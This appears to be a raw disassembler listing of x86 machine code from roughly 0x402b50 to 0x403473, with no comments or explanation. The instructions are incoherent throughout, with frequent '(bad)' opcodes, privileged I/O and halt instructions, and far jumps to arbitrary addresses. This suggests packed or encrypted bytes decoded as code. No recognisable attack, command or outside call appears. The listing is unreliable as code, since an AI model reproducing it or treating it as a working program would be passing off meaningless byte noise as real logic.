  402b50:	sub    BYTE PTR [edi-0x3],dl
  402b53:	sub    esp,DWORD PTR [edx-0xe383ccf]
  402b59:	add    esi,DWORD PTR [ebx+0x3]
  402b5c:	add    BYTE PTR [edx-0x50],ch
  402b5f:	add    ebx,ebp
  402b61:	pop    ss
  402b62:	xchg   BYTE PTR [esi],al
  402b64:	add    cl,ch
  402b66:	stc    
  402b67:	sub    ebx,DWORD PTR [ebx+0x3f]
  402b6a:	inc    ecx
  402b6b:	(bad)  
  402b6c:	or     cl,ch
  402b6e:	les    edi,FWORD PTR [edi-0x14]
  402b71:	bound  edi,QWORD PTR [esp+edi*8+0x1c5a90a]
  402b78:	add    BYTE PTR [ecx],0xfe
  402b7b:	push   ecx
  402b7c:	or     DWORD PTR [ecx-0x7],esi
  402b7f:	add    al,0x0
  402b81:	jmp    0xe944f316
  402b86:	out    dx,al
  402b87:	mov    dh,0xeb
  402b89:	idiv   BYTE PTR [ecx+0xd]
  402b8c:	pop    esp
  402b8d:	sbb    eax,0xbe3884f5
  402b92:	int3   
  402b93:	add    edi,DWORD PTR [edx+0x4f9e8]
  402b99:	xchg   edx,eax
	...
  402baa:	add    BYTE PTR [eax],al
  402bac:	cld    
  402bad:	mov    es,WORD PTR [eax]
  402baf:	jmp    0x698030ad
  402bb4:	add    DWORD PTR ds:0xc68e4d75,eax
  402bba:	leave  
  402bbb:	sub    edi,ebp
  402bbd:	add    al,0x55
  402bbf:	bound  ebx,QWORD PTR ds:0x76ba5634
  402bc5:	inc    edx
  402bc6:	or     al,0xec
  402bc8:	stc    
  402bc9:	add    BYTE PTR [eax],al
  402bcb:	jmp    0x41911078
  402bd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bd1:	sar    bh,1
  402bd3:	cs push esi
  402bd5:	int    0x8b
  402bd7:	inc    ecx
  402bd8:	dec    esi
  402bd9:	push   edx
  402bda:	or     BYTE PTR [edx+0x4],dh
  402bdd:	stc    
  402bde:	jmp    0x4d20:0xb3d95eb
  402be5:	add    al,BYTE PTR [eax+0x74c9b500]
  402beb:	cmc    
  402bec:	test   al,0x8e
  402bee:	je     0x402bf2
  402bf0:	das    
  402bf1:	(bad)  
  402bf3:	sar    BYTE PTR [ecx],0x83
  402bf6:	leave  
  402bf7:	jne    0x402bb6
  402bf9:	dec    edi
  402bfa:	ret    
  402bfb:	pop    ebx
  402bfc:	lds    ebx,FWORD PTR [ebx]
  402bfe:	leave  
  402bff:	ret    0x79b
  402c02:	push   ebx
  402c03:	push   esi
  402c04:	mov    bh,ah
  402c06:	(bad)  
  402c07:	jmp    DWORD PTR [ebx+0x57]
  402c0a:	xor    edx,edx
  402c0c:	ret    
  402c0d:	neg    edx
  402c0f:	nop
	...
  402c20:	add    BYTE PTR [eax],al
  402c22:	ja     0x402c74
  402c24:	movzx  esp,BYTE PTR [ebx-0x2cd4c3b0]
  402c2b:	sub    eax,0xc6d09006
  402c30:	ds nop
  402c32:	adc    ch,dh
  402c34:	cs nop
  402c36:	push   cs
  402c37:	add    edx,DWORD PTR [eax-0x70049e7d]
  402c3d:	inc    ebx
  402c3e:	test   DWORD PTR [bx+0x197c],0x249038fb
  402c47:	cld    
  402c48:	add    eax,DWORD PTR [eax+eiz*1]
  402c4b:	xchg   edi,eax
  402c4c:	inc    ebx
  402c4d:	cmp    al,0x52
  402c4f:	push   edi
  402c50:	jl     0x402c5d
  402c52:	out    0x1e,eax
  402c54:	nop
  402c55:	jg     0x402c34
  402c57:	jmp    0x3c43:0x96e09040
  402c5e:	mov    dl,0x56
  402c60:	jl     0x402c6c
  402c62:	out    0x3c,eax
  402c64:	nop
  402c65:	jg     0x402c45
  402c67:	jmp    0xc2c1:0x46130346
  402c6e:	fucom  st(4)
  402c70:	mov    cl,0xc1
  402c72:	cli    
  402c73:	and    eax,0xabb88b06
  402c78:	mov    ebx,0x3ad4a2c1
  402c7d:	nop
  402c7e:	jno    0x402c97
  402c80:	je     0x402ce0
  402c82:	inc    ecx
  402c83:	pop    ds
  402c84:	cmp    DWORD PTR [ebx+0x0],ecx
	...
  402c96:	add    BYTE PTR [eax],al
  402c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c99:	outs   dx,DWORD PTR ds:[esi]
  402c9a:	ss push esi
  402c9c:	mov    ss,WORD PTR [edi+0x58]
  402c9f:	or     BYTE PTR [edx+0x57],ch
  402ca2:	push   eax
  402ca3:	adc    BYTE PTR [edx+0x67],ch
  402ca6:	inc    eax
  402ca7:	or     al,0x8a
  402ca9:	out    dx,eax
  402caa:	stos   BYTE PTR es:[edi],al
  402cab:	jecxz  0x402cc5
  402cad:	sub    al,0x34
  402caf:	nop
  402cb0:	push   edx
  402cb1:	push   cs
  402cb2:	iret   
  402cb3:	call   FWORD PTR [ebp+0x2c]
  402cb6:	mov    cl,cl
  402cb8:	aam    0xe3
  402cba:	cdq    
  402cbb:	shl    DWORD PTR [edx-0x2c],0x73
  402cbf:	inc    ebx
  402cc0:	pop    eax
  402cc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cc2:	jae    0x402d1d
  402cc4:	push   0x5f
  402cc6:	lds    eax,FWORD PTR [edx+ecx*4]
  402cc9:	pop    edi
  402cca:	fadd   QWORD PTR [edx+ecx*4]
  402ccd:	add    ebp,DWORD PTR [esi+0x739f7190]
  402cd3:	pop    esi
  402cd4:	mov    ebp,0x6c2bcf6
  402cd9:	fdivr  QWORD PTR [eax]
  402cdb:	mov    ebx,DWORD PTR [esi]
  402cdd:	pop    ebp
  402cde:	(bad)  
  402cdf:	in     al,dx
  402ce0:	add    al,0x2b
  402ce2:	into   
  402ce3:	push   ebx
  402ce4:	rcl    DWORD PTR [esi],1
  402ce6:	add    BYTE PTR [ebp-0xa],0x8b
  402cea:	pop    ebx
  402ceb:	sub    ah,BYTE PTR [ebx]
  402ced:	popf   
  402cee:	add    edi,edi
  402cf0:	das    
  402cf1:	retf   
  402cf2:	sbb    al,0x41
  402cf4:	cli    
  402cf5:	inc    ebx
  402cf6:	es (bad) 
  402cf8:	cli    
  402cf9:	(bad)  
  402cfb:	mov    edi,0x0
	...
  402d0c:	add    BYTE PTR [eax],al
  402d0e:	inc    edi
  402d0f:	add    eax,0xf54fcecb
  402d14:	sbb    eax,0xea5eee58
  402d19:	pop    ecx
  402d1a:	cli    
  402d1b:	leave  
  402d1c:	xchg   esp,eax
  402d1d:	sti    
  402d1e:	lods   al,BYTE PTR ds:[esi]
  402d1f:	dec    edi
  402d20:	add    eax,0xe9c30edb
  402d25:	add    esi,ecx
  402d27:	les    edi,FWORD PTR [esp+eax*1+0x39]
  402d2b:	retf   0xcf74
  402d2e:	mov    ds:0xfa04acd9,al
  402d33:	std    
  402d34:	sar    ebp,0x76
  402d37:	mov    edi,0x77fa03e9
  402d3c:	shr    DWORD PTR fs:[ecx+ecx*8-0x3a],1
  402d41:	xor    al,0xd2
  402d43:	add    al,ch
  402d45:	add    edi,edx
  402d47:	fcom   QWORD PTR [ebx-0x1dfb0538]
  402d4d:	ret    
  402d4e:	std    
  402d4f:	adc    BYTE PTR [ebp+0x4],0xfa
  402d53:	add    al,0xdc
  402d55:	pop    es
  402d56:	sti    
  402d57:	add    al,0xe9
  402d59:	cld    
  402d5a:	jl     0x402cff
  402d5c:	jmp    0xe99f2764
  402d61:	jle    0x402de2
  402d63:	aad    0x7f
  402d65:	int    0x1d
  402d67:	xor    al,0x81
  402d69:	lea    edi,[esi]
  402d6b:	add    al,0xe9
  402d6d:	jle    0x402de6
  402d6f:	aad    0x67
  402d71:	int    0x0
	...
  402d83:	add    BYTE PTR ds:0xfc445134,al
  402d89:	enter  0xf956,0xb5
  402d8d:	push   edx
  402d8e:	in     eax,dx
  402d8f:	pop    ebx
  402d90:	stos   BYTE PTR es:[edi],al
  402d91:	sbb    eax,0x827703a8
  402d96:	cmp    cl,dh
  402d98:	(bad)  
  402d9a:	add    BYTE PTR [ecx+0x2ef6aeb1],bl
  402da0:	mov    edi,0x9f175c8
  402da5:	frstor [esi+edx*1]
  402da8:	scas   eax,DWORD PTR es:[edi]
  402da9:	enter  0xe6eb,0xc6
  402dad:	push   edx
  402dae:	or     BYTE PTR [ebp+esi*2-0x2c],bl
  402db2:	inc    BYTE PTR [esi]
  402db4:	mov    bh,0x35
  402db6:	call   0x8f1f9
  402dbb:	pusha  
  402dbc:	jge    0x402d97
  402dbe:	(bad)  
  402dbf:	out    dx,al
  402dc0:	mov    esi,0xfe53005b
  402dc5:	pop    edx
  402dc6:	add    dl,BYTE PTR [ebx-0xa]
  402dc9:	pop    edx
  402dca:	add    eax,DWORD PTR [ecx-0x2]
  402dcd:	add    al,0x0
  402dcf:	test   eax,0xc7ec923e
  402dd4:	ss enter 0xcde8,0x3a
  402dd9:	add    eax,0xccbc6000
  402dde:	inc    eax
  402ddf:	xor    eax,0xf975c75e
  402de4:	ss push edx
  402de6:	or     al,0x9e
	...
  402df8:	add    BYTE PTR [eax],al
  402dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dfb:	int3   
  402dfc:	call   0x885c8
  402e01:	bound  esp,QWORD PTR [ecx-0x38]
  402e04:	jne    0x402d87
  402e06:	inc    ecx
  402e07:	stos   DWORD PTR es:[edi],eax
  402e08:	ret    
  402e09:	jmp    0xfd1b2a07
  402e0e:	adc    al,bh
  402e10:	mov    ch,0x7d
  402e12:	aas    
  402e13:	enter  0x51ff,0xf4
  402e17:	rol    BYTE PTR [eax],0xe9
  402e1a:	cs xchg edx,eax
  402e1c:	in     al,dx
  402e1d:	push   edi
  402e1e:	mov    bh,0xe8
  402e21:	and    ebx,ecx
  402e23:	(bad)  
  402e24:	inc    DWORD PTR [eax]
  402e26:	push   0x11c95bc5
  402e2b:	enter  0x54ff,0x58
  402e2f:	test   al,0x81
  402e31:	les    ecx,FWORD PTR [edi]
  402e33:	mov    edx,0xb880ffff
  402e38:	jne    0x402e46
  402e3a:	fsubr  QWORD PTR [esi]
  402e3c:	or     BYTE PTR [eax-0x47],ch
  402e3f:	jmp    0x293e:0xeefc0040
  402e46:	push   edx
  402e47:	add    ebp,eax
  402e49:	mov    ecx,0xbffbba6
  402e4e:	jecxz  0x402e18
  402e50:	test   dl,bl
  402e52:	mov    ds:0xb82b0003,eax
  402e57:	dec    ebp
  402e58:	test   edi,ebp
  402e5a:	popf   
  402e5b:	mov    ebx,0x50ff
	...
  402e70:	mov    ebx,0x63000104
  402e75:	stos   DWORD PTR es:[edi],eax
  402e76:	in     al,0xc3
  402e78:	push   ebx
  402e79:	add    ecx,DWORD PTR [ebx]
  402e7b:	ror    BYTE PTR [edi+eax*2-0x43],0x0
  402e80:	arpl   WORD PTR [ebx],ax
  402e82:	cmp    eax,0x36204
  402e87:	paddq  mm5,QWORD PTR [esi+0x0]
  402e8b:	add    BYTE PTR [ebx+0x4c],dl
  402e8e:	inc    ebp
  402e8f:	cld    
  402e90:	repz test al,0xba
  402e93:	jmp    0x85cdea14
  402e98:	mov    WORD PTR [edx-0x56fc0001],?
  402e9e:	dec    edi
  402e9f:	std    
  402ea0:	mov    WORD PTR [ebx-0x20f93ff5],?
  402ea6:	addr16 mov al,0xeb
  402ea9:	inc    ecx
  402eaa:	add    BYTE PTR [ebp-0x1546a],cl
  402eb0:	cli    
  402eb1:	cs xor al,0xe8
  402eb4:	loop   0x402ee7
  402eb6:	retf   
  402eb7:	jmp    ebp
  402eb9:	mov    ebx,edi
  402ebb:	dec    edi
  402ebc:	ror    bl,cl
  402ebe:	sar    edi,1
  402ec0:	aad    0x43
  402ec2:	sti    
  402ec3:	inc    BYTE PTR [edi-0x1c]
  402ec6:	js     0x402e4d
  402ec8:	aad    0x1e
  402eca:	retf   
  402ecb:	jmp    FWORD PTR [edx]
  402ecd:	hlt    
  402ece:	mov    ecx,0x33efb5f5
  402ed3:	inc    DWORD PTR [eax]
	...
  402ee5:	add    BYTE PTR [edi],ah
  402ee7:	clc    
  402ee8:	xor    ebp,eax
  402eea:	sbb    al,0xf3
  402eec:	retf   0xf1ff
  402eef:	sbb    edx,DWORD PTR [eax+0x53]
  402ef2:	xchg   ebp,eax
  402ef3:	dec    ecx
  402ef4:	(bad)  
  402ef5:	call   0xb34a7
  402efa:	jae    0x402f15
  402efc:	int3   
  402efd:	cmp    edi,0xffffffe3
  402f00:	add    esi,DWORD PTR [eax+edi*4+0x60]
  402f04:	inc    eax
  402f05:	hlt    
  402f06:	retf   0x50b6
  402f09:	cld    
  402f0a:	push   edx
  402f0b:	out    dx,al
  402f0c:	mov    edi,0xc360fa00
  402f11:	js     0x402f1b
  402f13:	(bad)  
  402f14:	push   eax
  402f15:	hlt    
  402f16:	(bad)  
  402f17:	fcmovb st,st(6)
  402f19:	add    dl,bh
  402f1b:	rol    bl,cl
  402f1d:	je     0x402f33
  402f1f:	or     al,0xcb
  402f21:	jne    0x402f55
  402f23:	test   BYTE PTR ds:0x7e772df2,al
  402f29:	fadd   st,st(2)
  402f2b:	jle    0x402f7d
  402f2d:	clc    
  402f2e:	leave  
  402f2f:	jmp    0x402f0c
  402f31:	sub    al,0x8
  402f33:	dec    edi
  402f34:	retf   0x87ff
  402f37:	dec    edi
  402f38:	(bad)  
  402f3a:	cmp    BYTE PTR ds:0x407103e9,al
  402f40:	in     eax,dx
  402f41:	retf   0xcd6f
  402f44:	add    sp,dx
  402f47:	mov    ebx,0xca58
	...
  402f5c:	in     eax,0xc5
  402f5e:	mov    esp,0x5016d2c7
  402f63:	retf   0x79d5
  402f66:	sub    ch,BYTE PTR [esi]
  402f68:	ret    
  402f69:	ret    0x3e1
  402f6c:	das    
  402f6d:	jp     0x402f84
  402f6f:	xor    dh,BYTE PTR [ecx+0x47]
  402f72:	icebp  
  402f73:	fimul  WORD PTR [ebx]
  402f75:	add    al,BYTE PTR cs:[ecx]
  402f78:	cmp    BYTE PTR ds:0x3dfd7be8,0x69
  402f7f:	or     bh,dl
  402f81:	dec    edi
  402f82:	hlt    
  402f83:	sub    DWORD PTR [ebp+0x3e],eax
  402f86:	imul   ecx,DWORD PTR [edx],0x830350da
  402f8c:	vsubsd xmm3,xmm1,xmm7
  402f90:	jp     0x402f97
  402f92:	repz dec edi
  402f94:	pop    edx
  402f95:	test   BYTE PTR [esi],dl
  402f97:	sti    
  402f98:	jmp    0xf2879246
  402f9d:	lds    edi,FWORD PTR [esp+edi*8]
  402fa0:	push   ebp
  402fa1:	jg     0x402f4e
  402fa3:	add    al,0xfa
  402fa5:	xor    DWORD PTR [ecx+0x691dc404],0xc9c60248
  402faf:	dec    edi
  402fb0:	out    0x84,eax
  402fb2:	sbb    eax,0x1cf7350c
  402fb7:	cli    
  402fb8:	lods   eax,DWORD PTR ds:[esi]
  402fb9:	dec    eax
  402fba:	ror    eax,1
  402fbc:	lock push eax
  402fbe:	out    dx,al
  402fbf:	add    DWORD PTR [eax],0x0
	...
  402fd2:	sahf   
  402fd3:	or     al,0x7e
  402fd5:	sti    
  402fd6:	mov    ?,ebp
  402fd8:	jmp    FWORD PTR [esi-0x1600f346]
  402fde:	es add ch,bl
  402fe1:	jmp    0x403001
  402fe3:	mov    eax,0x9bc305f
  402fe8:	add    BYTE PTR [esi+ebp*2-0x25da7c4f],bh
  402fef:	pop    eax
  402ff0:	add    DWORD PTR [edx*4-0x616bf0d],0x38
  402ff8:	adc    ch,BYTE PTR [edx-0xb]
  402ffb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ffc:	cs test al,0xf9
  402fff:	add    al,0x74
  403001:	lock jbe 0x403006
  403004:	leave  
  403005:	iret   
  403006:	cmp    BYTE PTR ds:0xeffa9c00,al
  40300c:	mov    edi,0x8c760b2
  403011:	jmp    0xa5081014
  403016:	lds    eax,FWORD PTR ds:0x91f9e900
  40301c:	inc    ebp
  40301d:	icebp  
  40301e:	leave  
  40301f:	ret    
  403020:	jne    0x403013
  403022:	pop    ds
  403023:	add    eax,0xf39cf4ff
  403028:	inc    eax
  403029:	jmp    0x32b4b49c
  40302e:	inc    esi
  40302f:	cmp    eax,edx
  403031:	jmp    0x6d10c02f
	...
  403046:	add    BYTE PTR [eax],al
  403048:	adc    al,0xb9
  40304a:	push   eax
  40304b:	inc    ebx
  40304c:	push   ss
  40304d:	push   edi
  40304e:	call   esp
  403050:	xor    bl,0x40
  403053:	jmp    0xd0b4b496
  403058:	cmp    cl,BYTE PTR [edx-0x1c]
  40305b:	call   0x8e403559
  403060:	mov    ah,0xbc
  403062:	pop    DWORD PTR [eax]
  403064:	into   
  403065:	loopne 0x403066
  403067:	jne    0x403000
  403069:	cmp    al,0x45
  40306b:	in     al,dx
  40306c:	mov    al,ds:0xf000c4a
  403071:	mov    edi,0x9a345c6
  403076:	add    BYTE PTR [eax],al
  403078:	jecxz  0x40305a
  40307a:	pop    es
  40307b:	(bad)  
  40307c:	sahf   
  40307d:	xlat   BYTE PTR ds:[ebx]
  40307e:	add    BYTE PTR [eax],al
  403080:	rol    DWORD PTR [edi],cl
  403082:	push   0x0
  403084:	leave  
  403085:	pop    es
  403086:	push   0x10
  403088:	add    sp,sp
  40308b:	push   eax
  40308c:	mov    ecx,0xf75ff07
  403091:	int    0x15
  403093:	loope  0x40303a
  403095:	inc    esi
  403096:	add    BYTE PTR [ebx],cl
  403098:	jecxz  0x4030ed
  40309a:	add    DWORD PTR [ebx+0x20],eax
  40309d:	dec    ebx
  40309e:	hlt    
  40309f:	add    BYTE PTR [edi-0x608a0141],cl
  4030a5:	ficomp WORD PTR [edx-0x74f85c3f]
  4030ab:	ret    
	...
  4030bc:	add    BYTE PTR [eax],al
  4030be:	push   0x9308c27e
  4030c3:	repnz mov ch,ah
  4030c6:	xchg   esp,eax
  4030c7:	push   ebp
  4030c8:	or     al,ch
  4030ca:	out    dx,eax
  4030cb:	leave  
  4030cc:	add    BYTE PTR [eax],al
  4030ce:	and    edi,ecx
  4030d0:	out    0xa0,eax
  4030d2:	inc    ebx
  4030d3:	retf   
  4030d4:	call   DWORD PTR [eax+0x34]
  4030d7:	push   ebp
  4030d8:	or     BYTE PTR [eax+0x2b],dl
  4030db:	imul   eax,ecx,0xc8ef6300
  4030e1:	ret    0x75f
  4030e4:	push   ebp
  4030e5:	mov    esp,DWORD PTR [edi-0x79]
  4030e8:	(bad)  
  4030e9:	cld    
  4030ea:	lock xchg DWORD PTR [ebp+0x8],edi
  4030ee:	cli    
  4030ef:	lods   eax,DWORD PTR ds:[esi]
  4030f0:	push   eax
  4030f1:	pop    es
  4030f2:	shr    DWORD PTR [ebp+0x2b],1
  4030f5:	leave  
  4030f6:	cmp    BYTE PTR [ecx+0x17312b03],dh
  4030fc:	add    al,0x6a
  4030fe:	cli    
  4030ff:	pop    es
  403100:	add    al,0x6a
  403102:	cli    
  403103:	pop    es
  403104:	(bad)  
  403105:	inc    DWORD PTR [edi+0x600059b5]
  40310b:	lods   al,BYTE PTR ds:[esi]
  40310c:	fcmovnb st,st(4)
  40310e:	mov    ebx,0xba0b03ac
  403113:	fcom   DWORD PTR [edx]
  403115:	mov    DWORD PTR [edi],esi
  403117:	dec    eax
  403118:	(bad)  
  403119:	jne    0x4030f1
  40311b:	push   esp
  40311c:	cs lock int 0xfb
  403120:	cli    
  403121:	mov    edi,0x0
	...
  403132:	add    BYTE PTR [eax],al
  403134:	dec    esi
  403135:	or     BYTE PTR [ebx-0x28],bh
  403138:	push   eax
  403139:	lods   al,BYTE PTR ds:[esi]
  40313a:	pop    ecx
  40313b:	add    BYTE PTR [ebp+0x2053c799],dh
  403141:	sbb    eax,edi
  403143:	jne    0x403137
  403145:	test   DWORD PTR [ebx],eax
  403147:	push   0xfffffffa
  403149:	adc    ebp,DWORD PTR [ebp-0x3f]
  40314c:	cli    
  40314d:	stos   DWORD PTR es:[edi],eax
  40314e:	cli    
  40314f:	mov    edi,0xe832a407
  403154:	jecxz  0x403111
  403156:	(bad)  
  403157:	call   ecx
  403159:	(bad)  
  40315a:	jp     0x40311f
  40315c:	shl    DWORD PTR [ecx+eax*8+0x4],1
  403160:	cli    
  403161:	add    BYTE PTR [ebx-0x14],bh
  403164:	jns    0x4031ce
  403166:	xlat   BYTE PTR ds:[ebx]
  403167:	push   eax
  403168:	leave  
  403169:	sbb    al,0x32
  40316b:	push   edi
  40316c:	lods   al,BYTE PTR ds:[esi]
  40316d:	ss inc eax
  40316f:	or     al,0x7f
  403171:	and    al,0x83
  403173:	add    dl,bh
  403175:	stos   DWORD PTR es:[edi],eax
  403176:	js     0x40318c
  403178:	aaa    
  403179:	add    eax,0x4fa03e9
  40317e:	jb     0x40312b
  403180:	or     ebp,0x8bfcdba8
  403186:	and    al,0xd8
  403188:	jno    0x4031ca
  40318a:	icebp  
  40318b:	add    dl,BYTE PTR [ebx]
  40318d:	retf   
  40318e:	out    0x83,al
  403190:	jns    0x403138
  403192:	mov    dh,0x1a
  403194:	add    DWORD PTR [esi+0xb72],eax
	...
  4031aa:	mov    BYTE PTR [edx],dl
  4031ac:	jmp    0xfa03:0xe944b2ca
  4031b3:	in     eax,dx
  4031b4:	sub    DWORD PTR [edx],eax
  4031b6:	loop   0x403179
  4031b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031b9:	xlat   BYTE PTR ds:[ebx]
  4031ba:	jae    0x403215
  4031bc:	add    DWORD PTR [ecx+0x4f],edi
  4031bf:	mov    ch,0x26
  4031c1:	std    
  4031c2:	cli    
  4031c3:	in     eax,0xab
  4031c5:	pop    esi
  4031c6:	mov    ebp,0x917ce54a
  4031cb:	iret   
  4031cc:	push   ss
  4031cd:	mov    esi,0xa71f0d3c
  4031d2:	jo     0x403170
  4031d4:	cs cmp eax,0x11b53af6
  4031da:	or     al,dl
  4031dc:	jl     0x4031b5
  4031de:	xchg   ebp,eax
  4031df:	aaa    
  4031e0:	icebp  
  4031e1:	js     0x40321a
  4031e3:	mov    ch,0x99
  4031e5:	fucomi st,st(7)
  4031e7:	add    al,0xe9
  4031e9:	add    edi,DWORD PTR [esi+0x7b]
  4031ec:	in     eax,dx
  4031ed:	add    edi,edx
  4031ef:	add    al,0x72
  4031f1:	inc    edi
  4031f2:	or     dh,BYTE PTR [esi+0x5ec5268c]
  4031f8:	xor    BYTE PTR [ecx],ch
  4031fa:	ret    0xabcb
  4031fd:	clc    
  4031fe:	push   ebp
  4031ff:	pop    eax
  403200:	jb     0x4031da
  403202:	jns    0x4031cc
  403204:	add    BYTE PTR [ebp+0x1a505a14],dh
  40320a:	or     DWORD PTR [edi-0x75],edx
  40320d:	sbb    al,0x0
	...
  40321f:	add    BYTE PTR [edx],dh
  403221:	mov    ?,WORD PTR [ebp-0xf]
  403224:	mov    dl,0x47
  403226:	adc    BYTE PTR [eax-0x1b],ah
  403229:	ror    BYTE PTR [ebx+0x461a2e6],0x72
  403230:	iret   
  403231:	or     al,0x8b
  403233:	push   ss
  403234:	adc    cl,BYTE PTR [esi-0x1acc4507]
  40323a:	cli    
  40323b:	mov    edx,0xee848f33
  403240:	inc    ecx
  403241:	imul   ebp,DWORD PTR [edx+0x36],0x29c106fb
  403248:	out    0x3,eax
  40324a:	ret    
  40324b:	bound  esi,QWORD PTR [ebx-0x39f5070c]
  403251:	hlt    
  403252:	clc    
  403253:	ins    BYTE PTR es:[edi],dx
  403254:	dec    edx
  403255:	sbb    BYTE PTR [esi+0x7e],dl
  403258:	xchg   DWORD PTR [ebp-0x3a4268fd],ebp
  40325e:	ret    0xfaf5
  403261:	aam    0x8b
  403263:	and    DWORD PTR [ebx],ecx
  403265:	mov    esp,0xbc0b1323
  40326a:	lea    ebx,[ebp-0x59]
  40326d:	(bad)  [eax-0x37]
  403270:	cmc    
  403271:	add    ecx,DWORD PTR [esi-0xf]
  403274:	mov    eax,0x43ea11c6
  403279:	mov    edx,?
  40327b:	mov    edx,0x1af8e4b1
  403280:	inc    esi
  403281:	xchg   edx,eax
  403282:	pushf  
  403283:	inc    BYTE PTR [eax]
	...
  403295:	add    BYTE PTR [edi-0x31],al
  403298:	mov    ebp,0xc5efaa8
  40329d:	test   al,0x3a
  40329f:	pop    ss
  4032a0:	add    eax,DWORD PTR [eax]
  4032a2:	call   0xfae5:0x3933f93d
  4032a9:	xor    ecx,DWORD PTR [ecx-0x43f87bc9]
  4032af:	mov    eax,0x220f57b
  4032b4:	adc    cl,al
  4032b6:	arpl   cx,ax
  4032b8:	add    al,bl
  4032ba:	cwde   
  4032bb:	int3   
  4032bc:	xor    edi,ecx
  4032be:	xor    ah,cl
  4032c0:	xor    edi,ecx
  4032c2:	mov    gs,WORD PTR [edi]
  4032c4:	pop    ss
  4032c5:	sub    dl,BYTE PTR [ebp+0x41]
  4032c8:	inc    edi
  4032c9:	add    esp,ebp
  4032cb:	mov    ah,0xc0
  4032cd:	ret    0x51f
  4032d0:	ror    BYTE PTR [ebx+0x23fb155b],1
  4032d6:	pop    ecx
  4032d7:	adc    eax,0xb95f8dfb
  4032dc:	adc    al,BYTE PTR [esi+0x3]
  4032df:	mov    eax,ds:0xc2db4e03
  4032e4:	rcl    DWORD PTR [ecx],0xe0
  4032e7:	jge    0x403274
  4032e9:	cli    
  4032ea:	ror    bl,0x23
  4032ed:	stc    
  4032ee:	ror    bl,0x8d
  4032f1:	pushf  
  4032f2:	cld    
  4032f3:	add    edx,DWORD PTR [ebp+0x5e050e46]
  4032f9:	sbb    al,0x0
	...
  40330b:	add    dl,dl
  40330d:	les    edx,FWORD PTR [esi]
  40330f:	add    ebp,edx
  403311:	cmp    al,0xf9
  403313:	xor    edi,ecx
  403315:	in     al,0xfa
  403317:	xor    edi,ecx
  403319:	test   BYTE PTR ss:[edi],al
  40331c:	jmp    0x403349
  40331e:	sub    BYTE PTR [ecx-0x70],0x1
  403322:	and    cl,al
  403324:	mov    ds:0xe8c3030b,eax
  403329:	jg     0x40335e
  40332b:	stc    
  40332c:	cli    
  40332d:	or     bh,BYTE PTR [ebx+esi*1+0x17986063]
  403334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403335:	jle    0x40337f
  403337:	mov    edi,ecx
  403339:	pop    ss
  40333a:	call   0x6e96bff
  40333f:	shl    BYTE PTR [ecx+0x75],1
  403342:	idiv   edx
  403344:	fldenv [ebx-0x9]
  403347:	cli    
  403348:	jg     0x40337b
  40334a:	adc    esi,DWORD PTR [ecx+0x3c396c1]
  403350:	lods   al,BYTE PTR ds:[esi]
  403351:	(bad)
  403354:	jmp    0x403300
  403356:	int    0x8b
  403358:	adc    BYTE PTR [edx-0x45],bh
  40335b:	and    eax,DWORD PTR [ebx]
  40335d:	jp     0x40331a
  40335f:	lea    ebx,[esi-0x32]
  403362:	adc    edi,0x5e073556
  403368:	push   ds
  403369:	in     eax,dx
  40336a:	(bad)  
  40336b:	push   ss
  40336c:	stc    
  40336d:	hlt    
  40336e:	mov    ?,ecx
	...
  403380:	add    BYTE PTR [eax],al
  403382:	sub    DWORD PTR [edx-0x19],edx
  403385:	cli    
  403386:	or     DWORD PTR [edx-0x6f],eax
  403389:	test   ch,dh
  40338b:	or     DWORD PTR ds:0x49ab5190,edx
  403391:	xor    BYTE PTR [ebx-0x46fcf514],bh
  403397:	xor    edi,DWORD PTR [edi-0x44344ccd]
  40339d:	xor    esp,DWORD PTR [ebx-0x76e867d7]
  4033a3:	popf   
  4033a4:	fwait
  4033a5:	std    
  4033a6:	stc    
  4033a7:	popf   
  4033a8:	test   eax,0xd006b0b8
  4033ae:	jno    0x403364
  4033b0:	idiv   dl
  4033b2:	fnstenv [ecx+0x587faf6]
  4033b8:	jne    0x4033cc
  4033ba:	jl     0x4033fe
  4033bc:	pusha  
  4033bd:	push   0xfffffff9
  4033bf:	dec    esi
  4033c0:	adc    ebp,eax
  4033c2:	cmp    edx,DWORD PTR [edx+ebp*8]
  4033c5:	int    0x81
  4033c7:	mov    ebx,0xbc19bbfa
  4033cc:	cli    
  4033cd:	mov    ebx,0xe4d6a177
  4033d2:	cmc    
  4033d3:	js     0x4033f5
  4033d5:	pop    es
  4033d6:	aam    0x0
  4033d8:	test   al,0xc6
  4033da:	add    al,0x2
  4033dc:	ror    BYTE PTR [esi-0x196e0ddd],0x23
  4033e3:	repnz (bad) 
  4033e5:	nop
	...
  4033f6:	add    BYTE PTR [eax],al
  4033f8:	jle    0x403400
  4033fa:	or     ebp,ecx
  4033fc:	out    dx,eax
  4033fd:	mov    dh,0xea
  4033ff:	dec    ecx
  403400:	inc    bl
  403402:	test   eax,0x62c1f908
  403407:	mov    esi,0xbd0abd29
  40340c:	sub    DWORD PTR [edx+0x450d976c],edi
  403412:	call   0xbb1b:0xb701ba43
  403419:	ret    0x6f0
  40341c:	stos   BYTE PTR es:[edi],al
  40341d:	mov    DWORD PTR [ecx-0xa],eax
  403420:	ret    
  403421:	loope  0x403454
  403423:	test   ch,0x8f
  403426:	pop    ebp
  403427:	adc    cl,BYTE PTR [ebx+0x5b]
  40342a:	(bad)  
  40342b:	jmp    0xc50d8328
  403430:	mov    ebx,0x71cdea0e
  403435:	mov    edx,0xbcd9bcda
  40343a:	mov    edx,0xdea07fbd
  40343f:	ins    DWORD PTR es:[edi],dx
  403440:	mov    ebp,0xf4000076
  403445:	push   ds
  403446:	shr    DWORD PTR [edx],0xd
  403449:	add    bl,cl
  40344b:	jb     0x4033fe
  40344d:	icebp  
  40344e:	cli    
  40344f:	or     ah,BYTE PTR [ecx+esi*8+0x57264f8]
  403456:	pop    ebp
  403457:	stc    
  403458:	dec    edx
  403459:	xlat   BYTE PTR ds:[ebx]
  40345a:	add    ebp,DWORD PTR [edi]
	...
  40346c:	add    BYTE PTR [eax],al
  40346e:	bnd ret 
  403470:	shl    ah,0xfe
  403473:	ror    DWORD PTR [ebx+0x23b547b2],0xb0
